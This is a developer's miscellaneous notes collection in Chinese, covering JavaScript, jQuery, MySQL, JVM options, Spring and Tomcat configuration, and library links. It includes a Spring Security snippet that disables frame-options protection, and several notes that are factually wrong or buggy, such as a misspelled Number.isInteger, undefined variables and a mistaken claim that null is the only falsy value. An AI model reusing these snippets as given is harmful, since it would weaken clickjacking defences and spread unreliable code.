--------------------------------------------------------------------------------------
https://github.com/randoop/randoop 测试数据生成
https://github.com/jMotif/SAX
--------------------------------------------------------------------------------------
双字节长度
String.prototype.dbLength = function() {
    var str = this,leg=str.length;
    for (var i in str) {
        if (str.hasOwnProperty(i)) {
            var db = str[i].charCodeAt(0).toString(16).length == 4;
            if (db) leg += 1;
        }
    }
    return leg;
}
--------------------------------------------------------------------------------------
https://github.com/burtcorp/jmespath-java
--------------------------------------------------------------------------------------
在一个教室中最少应有多少学生才使得至少有两个学生的生日在同一天的概率不小于1/2？这个问题的答案为23
--------------------------------------------------------------------------------------
html5 requestAnimationFrame和setTimeout的区别就在于requestAnimationFrame比setTimeout更快执行
--------------------------------------------------------------------------------------
<script type="text/javascript">
        //<![CDATA[
        //]]
</script>
--------------------------------------------------------------------------------------
jQuery.holdReady( hold )
hold:如果值为true，则会延迟jQuery.ready()事件，如果值为false，则会解除对jQuery.ready()事件延迟
一直延迟到$.holdReady(False)
--------------------------------------------------------------------------------------
事件直接绑定在li上面 只能绑定到文档中已经存在的Li上面，后续添加的li是绑定不上的
$('ul li').on('click', function () {
   //todo
});

委托事件，也叫代理事件，只绑定了一次事件到li上面，也可以监听到后续添加的li
$('ul').on('click','li', function () {
    //todo
});
--------------------------------------------------------------------------------------
Mysql 自定义随机字符串
md5 32位
select ..., substring(MD5(RAND()),floor(RAND()*26)+1,6) as rand_str  6位

create FUNCTION rand_str(strlen SMALLINT ) RETURNS VARCHAR(255)
BEGIN
DECLARE randStr VARCHAR(255) DEFAULT 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
DECLARE i SMALLINT DEFAULT 0;
DECLARE resultStr VARCHAR(255) DEFAULT '';
WHILE i<strlen DO
SET resultStr=CONCAT(SUBSTR(randStr,FLOOR(RAND()*LENGTH(randStr))+1,1),resultStr);
SET i=i+1;
END WHILE;
RETURN resultStr;
END
--------------------------------------------------------------------------------------
MySQL binlog
STATEMENT格式中的DML操作对应的是QUERY_EVENT类型，ROW格式下的DML操作对应的是ROWS_EVENT类型

--------------------------------------------------------------------------------------
$('selector option:eq(1)').attr('selected','selected');
//设置Select的Text值为jQuery的项选中
$("#sel option[text='jQuery']").attr("selected", true);
//设置select的value值为1时被选中
$("#sel option[value='1']").attr("selected", true
--------------------------------------------------------------------------------------
<if test='startd != null and startd != "0"'>
--------------------------------------------------------------------------------------
关注
https://github.com/yuemingl/ExprEngine 表达式引擎
https://github.com/exbin/deltahex-java 16进制查看
--------------------------------------------------------------------------------------
var timer = requestAnimationFrame(function(){
    console.log(0);
});
cancelAnimationFrame(timer);

timer = requestAnimationFrame(function fn(){
        if(parseInt(myDiv.style.width) < 500){
            myDiv.style.width = parseInt(myDiv.style.width) + 5 + 'px';
            myDiv.innerHTML =     parseInt(myDiv.style.width)/5 + '%';
            timer = requestAnimationFrame(fn);
        }else{
            cancelAnimationFrame(timer);
        }
    });
--------------------------------------------------------------------------------------
d、提取指定position位置的binlog日志导入数据库
# mysqlbinlog --start-position="120" --stop-position="332" /opt/data/APP01bin.000001 | mysql -uroot -p

e、提取指定开始时间的binlog并输出到日志文件
# mysqlbinlog --start-datetime="2014-12-15 20:15:23" /opt/data/APP01bin.000002 --result-file=extra02.sql

-v -v，会生成字段的类型、长度、是否为null等属性信息
mysqlbinlog -v -v --base64-output=DECODE-ROWS mysql-bin.000002

–verbose(或-v)，将改动生成带注释的语句
mysqlbinlog -v --base64-output=DECODE-ROWS mysql-bin.000002
--------------------------------------------------------------------------------------
函数防抖就是让某个函数在上一次执行后, 满足等待某个时间内不再触发此函数后再执行,
 而在这个等待时间内再次触发此函数, 等待时间会重新计算
 underscore.js的函数防抖定义: _.debounce(fn, wait, [immediate]);
 $('#input').keypress(_.debounce(function() {
    //异步调用查询
}, 300));

函数节流
将即将被执行的函数使用setTimeout延迟一段时间执行, 如果该次延迟执行还没有完成, 则忽略接下来调用该函数的请求.
underscore.js的函数节流定义: _.throttle(fn, wait, [options]);

--------------------------------------------------------------------------------------
https://github.com/tj/co js异步

--------------------------------------------------------------------------------------
/**
 * 生成随机字符串(可指定长度)
 * @param len
 * @returns {string}
 */
randomString = function(len) {
    len = len || 8;
    var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';    /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
    var maxPos = $chars.length;
    var pwd = '';
    for (var i = 0; i < len; i++) {
        pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
}

function generateRandomAlphaNum(len) {
    var rdmString = "";
    for( ; rdmString.length < len; rdmString  += Math.random().toString(36).substr(2));
    return  rdmString.substr(0, len);
}
--------------------------------------------------------------------------------------
组织结构代码证验证 8位
本体代码采用系列（即分区段）顺序编码方法。
校验码按下列公式计算：
C9 = 11 - MOD ( ∑Ci * Wi ，11)
i 1 2 3 4 5 6 7 8
Wi 3 7 9 10 5 8 4 2
当MOD函数值为1（即 C9 = 10）时，校验码用字母X表示
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ

checkOrgCodeValid: function(el){
    var txtval = el.value;
    var values=txtval.split("-");
    var ws = [3, 7, 9, 10, 5, 8, 4, 2];
    var str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    var reg = /^([0-9A-Z]){8}$/;
    if (!reg.test(values[0])) {
        return false
    }
    var sum = 0;
    for (var i = 0; i < 8; i++) {
        sum += str.indexOf(values[0].charAt(i)) * ws[i];
    }
    var C9 = 11 - (sum % 11);
    var YC9 = values[1]+'';
    if (C9 == 11) {
        C9 = '0';
    } else if (C9 == 10) {
        C9 = 'X'  ;
    } else {
        C9 = C9+'';
    }
    return YC9 == C9;
}
--------------------------------------------------------------------------------------
js整形上界
Math.pow(2,53) +1 === Math.pow(2,53)

转整形 只能处理32位的整数
let myparseInt = num => num | 0
--------------------------------------------------------------------------------------
https://github.com/advantageous/reakt
https://github.com/dakusui/combinatoradix
https://github.com/dgawlik/JavaAsync
--------------------------------------------------------------------------------------
String.fromCharCode(32)
--------------------------------------------------------------------------------------
function *generator(z) {
  console.log(1);
  var x = (yield 2) +z
  console.log(x);
  console.log(3);
  var y = yield 4;
  console.log(y)
}

var g = generator(5);
console.log(g.next(7));
//1
//{value: 2, done: false}

console.log(g.next(8));
//13--=8+5
//3
//{value: 4, done: false}

console.log(g.next(9));
//9
//{value: undefined, done: true}

console.log(g.next(10));
//{value: undefined, done: true}

Generator的核心实际上就是一个Iterator
1对生成器执行next()操作，进行生成器的入口开始执行代码
2执行到第一个yield时，向调用者返回一个值，并将函数挂起；
3挂起时，函数当前的执行上下文环境和参数被保存下来；
4执行到第二个yield时，参数从挂起状态被重新调用，进入上次挂起的执行上下文环境继续下面的操作，到下一个yield操作时重复上面的过程
--------------------------------------------------------------------------------------
https://github.com/poetix/octarine
--------------------------------------------------------------------------------------
系统环境变量中增加一个变量，变量名为: JAVA_TOOL_OPTIONS， 变量值为：-Dfile.encoding=UTF-8
http://docs.oracle.com/javase/6/docs/platform/jvmti/jvmti.html#tooloptions
--------------------------------------------------------------------------------------
letter-spacing: normal;
--------------------------------------------------------------------------------------
去掉标签的hover效果
$(#hover_div).unbind(mouseenter).unbind(mouseleave);
--------------------------------------------------------------------------------------
https://github.com/dianping/puma/tree/master/puma/src/main/java/com/dianping/puma/storage/cache
点评
--------------------------------------------------------------------------------------
随机取出不同的元素
function shuffle(array) {
    var m = array.length,
        t, i;
    // 如果还剩有元素…
    while (m) {
        // 随机选取一个元素…
        i = Math.floor(Math.random() * m--);
        // 与当前元素进行交换
        t = array[m];
        array[m] = array[i];
        array[i] = t;
    }
    return array;
}

//用法
var message = shuffle(totalArr);
message = message.slice(0, 3);
--------------------------------------------------------------------------------------
https://github.com/dragon66/icafe
https://github.com/jrachiele/java-timeseries
https://github.com/shagaba/jackson-patch-sync
https://github.com/aterai/java-swing-tips
--------------------------------------------------------------------------------------
Chrome浏览器中特有的函数 $$。你可以在你的Chrome浏览器控制台中输入 $$('a')，然后你就能得到一个当前页面中所有锚元素的列表
--------------------------------------------------------------------------------------
截断求和
var aa = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
    sum = 0;

sum = a.slice(0,11).reduce(function(pre,current){
    return pre + current;
});

console.log(sum);
--------------------------------------------------------------------------------------
不使用loop循环，创建一个长度为100的数组，并且每个元素的值等于于它的下标
var q = Array(100).join(',').split(',').map(function(item,idx){
        return idx;
});
console.log(q);
--------------------------------------------------------------------------------------
console.group('凡人');
console.log("手");
console.log("脚");
console.groupEnd();

var data = [
    {
        '姓名': '幼儿园',
        '性别': '女'
    },
    {
        '姓名': '李狗嗨',
        '数量': 1
    }
];
console.table(data);

console.clear();


--------------------------------------------------------------------------------------
Object.getOwnPropertyDescriptor(Date.prototype, 'toString');

let proto = Date.prototype;
let names = Object.getOwnPropertyNames(proto).filter((name) => /^to[a-zA-Z]*String/.test(name));
console.log(names);
--------------------------------------------------------------------------------------
jdbcTemplate <property name="maxRows" value="1000" ></property>
--------------------------------------------------------------------------------------
获取body中所有代码，新建一个空白页面，调用document.write()方法写入
function print(){
    var bd=document.body.innerHTML;
    w=window.open('about:blank');
    w.document.write(bd);
    w.print();
    w.document.close();
};
--------------------------------------------------------------------------------------
SET @curr_income := 0;
SET @prev_income := 0;
SET @rank := 0;

SELECT
  name,
  @curr_income := income                                      AS income,
  @rank := if(@prev_income != @curr_income, @rank + 1, @rank) AS rank,
  @prev_income := @curr_income                                AS dummy
FROM income
ORDER BY income DESC

SELECT
  a1.name,
  a1.income,
  count(*) AS rank
FROM income AS a1, income AS a2
WHERE a1.income < a2.income OR (a1.income = a2.income AND a1.name <= a2.name)
GROUP BY a1.name, a1.income
ORDER BY rank;


--------------------------------------------------------------------------------------
if (typeof name === "undefined") {
       name = name || "James";
   }
--------------------------------------------------------------------------------------
function parsePage() {
    var searchString = window.location.search.substr(1).split('&').filter(v => v.indexOf('page') !== -1)[0];
    var page = Number(searchString.split('=')[1]);
    return isNaN(page) ? 1 : page;
}
--------------------------------------------------------------------------------------
Object.defineProperty(obj, 'say', {enumerable: false}); // unenumerable property
--------------------------------------------------------------------------------------
https://clipboardjs.com/ 浏览器文本复制到剪贴板
--------------------------------------------------------------------------------------
JSON.stringify(a,null,2)
第二个参数它为 {Array|Function} 类型，如果为 Array 则用于过滤 key，如果为 Function 则可以对 value 做处理
第三个参数可以设置空白字符来美化输出
--------------------------------------------------------------------------------------
debug全局变量
Object.defineProperty(window, "i", {
    get : function(){ return window.i; },
    set : function(newValue){ debugger;window.i = newValue; },
    enumerable : true,
    configurable : true
});

window.__defineSetter__('i', function(){ debugger })

--------------------------------------------------------------------------------------
如果待加载的页面不存在于缓存中，会触发 onload ，再触发 pageShow
如果待加载的页面存在于缓存中，不触发 onload，只触发 pageShow
pageShow 事件对象 event 中有一个属性值，叫做 persisted，如果这个值为 true，则为缓存数据，false，则为第一次加载
--------------------------------------------------------------------------------------
初始大小
 (int) ((float) expectedSize / 0.75F + 1.0F);
--------------------------------------------------------------------------------------
executor.prestartCoreThread()预创建所有core线程
https://github.com/springside/springside4/blob/master/modules/utils/src/main/java/org/springside/modules/utils/ThreadPoolBuilder.java
--------------------------------------------------------------------------------------
https://github.com/amaembo/huntbugs
https://github.com/mokies/ratelimitj
https://github.com/qala-io/datagen
--------------------------------------------------------------------------------------
JDK7的SecureRandom
generateSeed()与next*()
generateSeed()可以为其他安全算法生成种子，随机度需求更高些。
nextInt(), nextLong()则是我们更关心的生成随机数，最后都是调用nextBytes()。
-Djava.security=file:/dev/./urandom
--------------------------------------------------------------------------------------
把安全点日志打印到独立文件
-XX:+UnlockDiagnosticVMOptions -XX: -DisplayVMOutput -XX:+LogVMOutput -XX:LogFile=/dev/shm/vm.log
打开Diagnostic 关掉输出VM日志到stdout，输出到独立文件，/dev/shm目录（内存文件系统）
--------------------------------------------------------------------------------------
取消偏向锁 -XX:-UseBiasedLocking
-XX:AutoBoxCacheMax=20000

XX:+PerfDisableSharedMem
禁止JVM写statistics数据，代价是jps,jstats 用不了，只能用JMX取数据


--------------------------------------------------------------------------------------
$("a[id$='_eventBtn']
--------------------------------------------------------------------------------------
增加-XX:+TraceClassLoading和-XX:+TraceClassUnloading, 看看哪些class加载了，哪些class卸载了
--------------------------------------------------------------------------------------
https://github.com/MGunlogson/CuckooFilter4J
--------------------------------------------------------------------------------------
https://github.com/andygibson/datafactory
--------------------------------------------------------------------------------------
命令模式下, shift + . 就是tab,  shift + , 反tab

--------------------------------------------------------------------------------------
Number.isInteger = Number.isInteger || function(value) {
    return typeof value === "number" &&
           isFinite(value) &&
           Math.floor(value) === value;
};
--------------------------------------------------------------------------------------
js浮点转整数
number | 0;
~~number
--------------------------------------------------------------------------------------
mysql 批处理文件出错后继续执行
mysql -uroot -ppassword - -force  [db] < patch.sql
--------------------------------------------------------------------------------------
组合字符
console.log('\u0061\u030A');

16进制转义
var str = '\x4A\x61vaScript';
console.log(str);

Unicode转义序列
var str = 'I\u0020learn \u0055nicode';
console.log(str);

代码点转义序列 \u{<hex>}
var str = 'Funny cat \u{1F639}';
console.log(str);
var reg = /\u{1F639}/u;  -->u,它支持额外的Unicode特性
console.log(reg.test(str));

var niceEmoticon = '\u{1F607}';
var spNiceEmoticon = '\uD83D\uDE07'
niceEmoticon==spNiceEmoticon

归一化
var str1 = '?a va bien';
var str2 = 'c\u0327a va bien';
console.log(str1 === str2.normalize()); // => true

长度 字符迭代器
var str = 'cat\u{1F639}';
console.log(str);             // => 'cat?'
console.log([...str]);        // => ['c', 'a', 't', '?']
console.log([...str].length); // => 4

比较长的组合字符序列并不都有对应的单个字符标准形式
var drink = 'cafe\u0327\u0301';
console.log(drink);                    // => 'cafe??'
console.log(drink.length);             // => 6
console.log(drink.normalize());        // => 'caf??'
console.log(drink.normalize().length); // => 5

error下标访问
var omega = '\u{1D6C0} is omega';
console.log(omega);        // => '? is omega'
console.log(omega[0]);     // => '' (unprintable symbol)
console.log(omega[1]);     // => '' (unprintable symbol)

var omega = '\u{1D6C0} is omega';
console.log(omega);                        // => '? is omega'
// Option 1
console.log([...omega][0]);                // => '?'
// Option 2
var number = omega.codePointAt(0);
console.log(number.toString(16));          // => '1d6c0'
console.log(String.fromCodePoint(number)); // => '?'

--------------------------------------------------------------------------------------
拷贝数据 JSON.parse(JSON.stringify(obj));
无法克隆两类属性：prototype和function

想拷贝对象中的function定义，那就用Lo-Dash的_.cloneDeep(obj)
--------------------------------------------------------------------------------------
jQuery
preventDefault() - 阻止事件默认程序的执行，但不会阻止事件的传播
stopPropagation() - 阻止事件的传播，但会执行完当前对象上绑定的事件处理程序
stopImmediatePropagation() - 阻止当前对象上未执行的事件处理程序，同时阻止事件的传播
如果你想在事件的handleEventA结束后停止任何后续绑定的处理程序，以及DOM默认的处理程序，
请手动调用preventDefault() && stopImmediatePropagation()
--------------------------------------------------------------------------------------
创建一个大小为N的数组，并且为他们添加相同的前缀
Array.apply(null, Array(6)).map(function(item, index){
    return "ball_" + index;
});


--------------------------------------------------------------------------------------
var a0="\n\t\r";
var a=JSON.stringify(a0);
var b=a.replace(/[\\]([^\"])/g, "\\\\$1");
console.log('a-->'+a);
console.log('b-->'+b);
--------------------------------------------------------------------------------------
reduce是升序，即角标从0开始，而reduceRight是降序，即角标从arr.length-1开始
function AppendToArray(previousValue, currentValue) {
    return previousValue + currentValue;
}
var word = "retupmoc";
var result = [].reduceRight.call(word, AppendToArray, "the ");
"the computer"
--------------------------------------------------------------------------------------
js柯里化是逐步传参，逐步缩小函数的适用范围，逐步求解的过程
var concat3WordsCurrying = function(a) {
    return function (b) {
        return function (c) {
            return a+b+c;
        };
    };
};

var adder = function () {
    var _args = [];
    return function () {
        if (arguments.length === 0) {
            return _args.reduce(function (a, b) {
                return a + b;
            });
        }
        [].push.apply(_args, [].slice.call(arguments));
        return arguments.callee;
    }
};
返回一个新的函数，新的函数接收可分批次接受新的参数，延迟到最后一次计算

var currying = function (fn) {
    var _args = [];
    return function () {
        if (arguments.length === 0) {
            return fn.apply(this, _args);
        }
        Array.prototype.push.apply(_args, [].slice.call(arguments));
        return arguments.callee;
    }
};

反柯里化的作用在与扩大函数的适用性，使本来作为特定对象所拥有的功能的函数可以被任意对象所用
反柯里化是 函数的借用，是函数能够接受处理其他对象
var uncurrying= function (fn) {
    return function () {
        var args=[].slice.call(arguments,1);
        return fn.apply(arguments[0],args);
    }
};
var test="a,b,c";
var split=uncurrying(String.prototype.split);
console.log(split(test,','));

var uncurrying= function (fn) {
    return function () {
        var context=[].shift.call(arguments);
        return fn.apply(context,arguments);
    }
};

var uncurrying= function (fn) {
    return function () {
        return Function.prototype.call.apply(fn,arguments);
    }
}
--------------------------------------------------------------------------------------
<security:http ……>
      <!-- 设置允许嵌套iframe -->
      <security:headers><security:frame-options disabled="true"/></security:headers>
<security:http />
--------------------------------------------------------------------------------------
mybatis useCache="false" flushCache="true"
--------------------------------------------------------------------------------------

console.log("%d年%d月%d日",2016,10,24);
--------------------------------------------------------------------------------------
编辑/etc/sysctl.conf文件，开启iptables转发（FORWARD）功能
net.ipv4.ip_forward = 1
--------------------------------------------------------------------------------------
http
no-cache: 告诉浏览器、缓存服务器，不管本地副本是否过期，使用资源副本前，一定要到源服务器进行副本有效性校验。
must-revalidate：告诉浏览器、缓存服务器，本地副本过期前，可以使用本地副本；本地副本一旦过期，必须去源服务器进行有效性校验

max-age：源站返回的内容，max-age是多少（单位是s）。
change：源站返回的内容，是否变化，如果是1，则变化。
--------------------------------------------------------------------------------------
查询每门课程前两名的学生以及成绩
select a.name,a.course,a.score
  from test1 a left join test1 b
  on a.course=b.course and a.score<b.score
  group by a.name,a.course,a.score
  having count(b.id)<2
  order by a.course,a.score desc;

  select *
  from test1 a
  where 2>(select count(*) from test1 where course=a.course and score>a.score)
  order by a.course,a.score desc;

--------------------------------------------------------------------------------------
js
throw 过程是阻塞的，程序会中断在第一个抛出错误的地方，所以后面的代码不会执行

Error.captureStackTrace(targetObject[, constructorOpt])
在targetObject中添加一个.stack属性。对该属性进行访问时，将以字符串的形式返回Er

const myObject = {};
Error.captureStackTrace(myObject);
myObject.stack

--------------------------------------------------------------------------------------
lodash 的延迟处理
filter() {
    let chain = _(this.data); --隐式调用
    for (let f of this.getFilters()) {
        chain = chain.filter(f);
    }
    return chain.value();
}
--------------------------------------------------------------------------------------
function F () {
    function C() {
        return this;
    }
    return C();
}
var o = new F();
console.log(o.constructor.name); // Object
这里的this指向全局对象，因为 C() call without new。

function F () {
    function C() {
        console.log(this);  // C {}
        return this;
    }
    return new C();
}
var o = new F();
console.log(o.constructor.name); // C
 C() 的前面添加了 new ，这个函数就变成了一个构造函数，this 是一个由 C() 构造器创建的一个实例，所以在这里 this 指向了o
--------------------------------------------------------------------------------------
在for循环中使用ajax的异步同步数据时，如何按照给定数据的先后顺序去执行
var data = ['one','two','three','four','five','six','seven','eight'];

var defer = $.Deferred();
//这一步必须要写，要不然下面的then无法使用
defer.resolve($("#showContent").append("这个里面可以什么都不写<br/>"));


$.each(data,function(i,e){
  defer = defer.then(function () {
      return $.ajax({
        url:'/echo/json/',
      method:'get',
      beforeSend:function(){
        $("#showContent").append(e + "开始数数<br/>");
      },
      success:function(data){
          $("#showContent").append(e + "执行完成<br/>");
        //如果返回的结果有问题，这里可以用return false退出循环
      }
    })
  });
});

defer.done(function(){
    $("#showContent").append("ajax全部执行完成<br/>")
});
--------------------------------------------------------------------------------------
Unicode字符属性别名 判断是否都是由大写字母组成 Pattern类
String regexExp = "^[\\p{Lu}]*$";
ASCII
String regexExp = "^[\\p{ASCII}]*$";
--------------------------------------------------------------------------------------
https://github.com/coolwanglu/pdf2htmlEX  PDF转HTML
--------------------------------------------------------------------------------------
回退(Fallback)
常见的回退策略有：
自定义处理：在这种场景下，可以使用默认数据，本地数据，缓存数据来临时支撑，也可以将请求放入队列，或者使用备用服务获取数据等
，适用于业务的关键流程与严重影响用户体验的场景，如商家/产品信息等核心服务。
故障沉默（fail-silent）：直接返回空值或缺省值，适用于可降级功能的场景，如产品推荐之类的功能，数据为空也不太影响用户体验。
快速失败（fail-fast）：直接抛出异常，适用于数据非强依赖的场景，如非核心服务超时的处理
--------------------------------------------------------------------------------------
js
window.fetch 判断浏览器是否支持
fetch()
.then(response => {
  if (response.ok) {
  // 成功处理
  }
}).catch(error => {
  // 异常处理
})

var headers = new Headers();
headers.append('Content-Type', 'image/jpeg');

var init = {
  method: 'GET',
  headers: headers,
  mode: 'cors',
  cache: 'default'
};

fetch('xxxxx.jpg', init)
.then(response => {
  // XXXX
});
--------------------------------------------------------------------------------------
underscore throttle 和 debounce不同之处
throttle 和 debounce 是解决请求和响应速度不匹配问题的两个方案。二者的差异在于选择不同的策略

throttle 策略的电梯。保证如果电梯第一个人进来后，15秒后准时运送一次，不等待。如果没有人，则待机。
debounce 策略的电梯。如果电梯里有人进来，等待15秒。如果又人进来，15秒等待重新计时，直到15秒超时，开始运送

_.debounce主要作用是，当某个函数连续被触发时，限制这个函数只有在当最后一次触发延迟一段时间之后才真正被执行
throttle在一定的时间内限制函数执行的次数
--------------------------------------------------------------------------------------
var obj = {}
//第一种情况：writable设置为false，不能重写。
Object.defineProperty(obj,"newKey",{
    value:"hello",
    writable:false
});
//更改newKey的值
obj.newKey = "change value";
console.log( obj.newKey );  //hello

configurable
是否可以删除目标属性或是否可以再次修改属性的特性
设置为true可以被删除或可以重新设置特性；设置为false，不能被可以被删除或不可以重新设置特性。默认为false。

//第一种情况：configurable设置为false，不能被删除。
Object.defineProperty(obj,"newKey",{
    value:"hello",
    writable:false,
    enumerable:false,
    configurable:false
});
//删除属性
delete obj.newKey;
console.log( obj.newKey ); //hello

//第二种情况：configurable设置为true，可以被删除。
Object.defineProperty(obj,"newKey",{
    value:"hello",
    writable:false,
    enumerable:false,
    configurable:true
});
//删除属性
delete obj.newKey;
console.log( obj.newKey ); //undefined

使用Object.defineProperty给对象添加属性，那么如果不设置属性的特性，
那么configurable、enumerable、writable这些值都为默认的false

当使用了getter或setter方法，不允许使用writable和value这两个属性
--------------------------------------------------------------------------------------
iframe
1.父级页面获取iframe页面中的元素对象（关键contentWindow）：
document.getElementById(iframe的id).contentWindow.document.getElementById(iframe页面元素id)

2.iframe页面获取父级页面的元素对象（关键window.parent）：
window.parent.document.getElementById(父级页面的元素id)
--------------------------------------------------------------------------------------
java.lang.Class.getMethods不保证返回顺序
--------------------------------------------------------------------------------------
Array.prototype.slice.call({
 0:"likeke",
 1:12,
 2:true,
 length:3
});

ES6中Array.from方法
Array.from({
 0:"lk",
 1:12,
 2:2013,
 3:"长安大学",
 length:4
});
--------------------------------------------------------------------------------------
function groupArray(data, cols) {
    const list = [];
    let current = [];

    // for (t of data) {
    data.forEach(t => {
        current.push(t);
        if (current.length === cols) {
            list.push(current);
            current = [];
        }
    });
    // }    // for (t of data)

    if (current.length) {
        list.push(current);
    }
    return list;
}
--------------------------------------------------------------------------------------
druid 配置StatFilter
<property name="filters" value="stat" />
<property name="connectionProperties" value="druid.stat.slowSqlMillis=5000" />
--------------------------------------------------------------------------------------
mysql
set log_timestamps=SYSTEM 默认设置是UTC

--------------------------------------------------------------------------------------
https://github.com/Nike-Inc/wingtips 链路追踪
--------------------------------------------------------------------------------------
https://github.com/macek/jquery-serialize-object js表单序列化
http://www.jplayer.cn/developer-guide.html js视频播放
http://www.helloweba.com/demo/2016/currencyFmatter/ js货币格式化
-------------------------------------------------------------------------------------
jQuery在1.8版本前，可以使用如下代码获取DOM元素绑定数据：
$.data(domObj,'events');//或者$('selector').data('events')
1.8版本以后：
$._data(domObj,'events');

使用下面的写法可以兼容各个版本：
var eventsData = $.data(domObj,'events') || $._data(domObj,'events');
--------------------------------------------------------------------------------------
yourkit性能监控工具，远程监控
--------------------------------------------------------------------------------------
if (!String.prototype.trim) {
  String.prototype.trim = function () {
    return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, '');
  };
}
\uFEFF BOM
“\xA0”其实就是HTML中常见的“&nbsp”
--------------------------------------------------------------------------------------
反转义
var a = '&amp;'
var c = document.createElement('div');
c.innerHTML = a;
a = c.innerText || c.textContent;
c = null;
console.log(a)
--------------------------------------------------------------------------------------
var scope = "global scope";
function checkscope(){
    var scope = "local scope";
    function f(){
        return scope;
    }
    return f();
}
checkscope();  "local scope"


var scope = "global scope";
function checkscope(){
    var scope = "local scope";
    function f(){
        return scope;
    }
    return f;
}
checkscope()(); "local scope"
--------------------------------------------------------------------------------------
tomcat修改jsessionid在cookie中的名称
<Context path=”/” docBase=”webapp” reloadable=”false” sessionCookieName=”yoursessionname”></Context>
--------------------------------------------------------------------------------------
https://github.com/pa7/heatmap.js 热点图
https://github.com/nolanlawson/optimize-js 加快js初始化
https://github.com/luruke/barba.js 创建两个页面之间的平滑过渡效果
https://github.com/metafloor/bwip-js 生成条形码和二维码
--------------------------------------------------------------------------------------

MySQL的变更记录叫binlog, Oracle的称之为redolog
数据库中间件有以下几种：
分布式数据库分表分库
数据增量订阅与消费:典型代表Canal，根据MySQL的binlog实现。也有针对Oracle(redolog)的增量数据订阅与消费的中间件。（Canal, Erosa）
数据库同步（全量、增量、跨机房、复制） Otter, JingoBus, DRC
跨数据库（数据源）迁移

Cobar解决的问题
分布式：Cobar的分布式主要是通过将表放入不同的库来实现

Cobar的约束
不支持跨库情况下的join、分页、排序、子查询操作
SET语句执行会被忽略，事务和字符集设置除外
分库情况下，insert语句必须包括拆分字段列名
分库情况下，update语句不能更新拆分字段的值

--------------------------------------------------------------------------------------
解决Oracle导出dmp文件空表不能导出的问题
设置deferred_segment_creation的值为false
alter system set deferred_segment_creation=false;
此方法只对以后的表有效，之前的表还是没分配空间。

创建表的时候声明立即创建Segment
create table table_name segment creation immediate;

select 'alter table '||table_name||' allocate extent;' from user_tables where num_rows=0
--------------------------------------------------------------------------------------
mysql
skip-character-set-client-handshake 忽略客户端字符集的设置，强制使用服务端character-set-server的设置
--------------------------------------------------------------------------------------
overflow-y属性在垂直方向上存在溢出的时候，通过设置不同的值会产生不同的表现
overflow-y: scroll;

设置webkit浏览器的私有属性::-webkit-scrollbar
::-webkit-scrollbar{
    display: none
}

在ios设备中，利用overflow来模拟滚动会出现卡顿的情况，可以通过设置-webkit-overflow-scrolling: touch来解决
--------------------------------------------------------------------------------------
.disable-hover {
    pointer-events: none;
}
pointer-events 是一个 CSS 属性
pointer-events: none; 禁止鼠标行为 元素不会成为鼠标事件的 target 可用来提高滚动时的帧频
--------------------------------------------------------------------------------------
https://github.com/SheetJS/js-xlsx  js解析xlsx
--------------------------------------------------------------------------------------
获取图片的原始尺寸
function  getNaturalSize(img){
        var naturalSize ={};
        if(window.naturalWidth && window.naturalHeight){
            naturalSize.width = img.width;
                naturalSize.height = img.height;
        }else{
            var image = new Image();
            image.src = img.src;
            naturalSize.width = image.width;
            naturalSize.height = image.height;
        }
        return naturalSize;
    }
--------------------------------------------------------------------------------------
null是基本类型中唯一的假值
var a = null;
(!a && typeof a === "object"); //true

数组是对象,是object的一个子类型
typeof [1,2,3] === "object"; //true


数组中数字和字符作为索引时,数组长度只统计数字部分
var a = [];
a[0] = 1;
a["bugall"] = 2;
a.length; //1
a["bugall"] = 2;
a.bugall = 2;

如果字符串键值能够被强制类型转换为十进制数字的话,
它会被当做数组索引处理
var a = [];
a["13"] = 42;
a.length; //14

javascript只有一种数值类型:number

42.toFixed(2) //SyntaxError .被视为常量42.的一部分
42..toFixed(2) = 42.00

如何判断两个小数是否相等
function numbersCloseEnoughToEqual(n1,n2){
    return Math.abs(n1-n2)<Number.EPSILON
}
numbersCloseEnoughToEqual(0.3,0.3) //true

整形检测
Number.isInterger(42) //true
Number.isInterger(42.000) //true
Number.isInterger(42.001) //false

 当null,undefined作为this的绑定对象传入call,apply,bind的时候,实际应用的是默认绑定

 call,apply属于显示绑定
bind属于硬绑定,硬绑定属于显示绑定的一种

硬绑定的缺点
硬绑定会降低函数的灵活性,使用硬绑定之后就
无法使用隐式绑定或是显式绑定来修改this

new绑定与隐式绑定,new绑定优先级高于隐式绑定
function foo(somethis){
    this.a = somethis
}
var obj1 = {
    foo:foo
}
var obj2 = {}
obj1.foo(2)
console.log(obj1.a)//2

obj1.foo.call(obj2,3)
console.log(obj2.a) //3

var bar = new obj1.foo(4)
console.log(obj1.a) //2
console.log(bar.a) //4
bar被绑定到obj1上,但是new bar(3)并没有像我们预期的那样把obj1.a修改为3
相反,new修改了硬绑定(到obj1的)调用bar(...)中的this,因为使用了new绑定得到
一个名字为baz的新对象,并且baz.a的值是3

对象引用链中,只有最后一层在调用位置中起作用
function foo(){
    console.log(this.a)
}
var obj2 = {
    a:42,
    foo:foo
}
var obj1 = {
    a:2,
    obj2:obj2
}
obj1.obj2.foo() //42

匿名函数无法指向自身
function foo(){
   foo.count = 4; //foo指向自身
}

2..toString(); // 第二个点号可以正常解析
2 .toString(); // 注意点号前面的空格
(2).toString(); // 2先被计算
--------------------------------------------------------------------------------------
length的本质是跟踪array中的max_index，并始终保持值是max_index + 1
var array_object = [1, 2, 3];
delete array_object[1];

// 不跳过洞
for(var i=0; i<array_object.length; i++) {
    console.log(array_object[i]);
};
//1 undefined 3

//跳过洞
array_object.forEach(function(s) {
    console.log(s);
});
// 1 3

var arr1 = ['a', 'b', 'c', 'd', 'e'];
var arr2 = arr1.concat(); // 使用concat()方法，返回新的数组
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000007656902  轻量高效无依赖的开源JS插件和库
--------------------------------------------------------------------------------------
Array.apply(null, Array(30)).map(() => 4)
构造一个长度为 30 的数组，默认值是 4

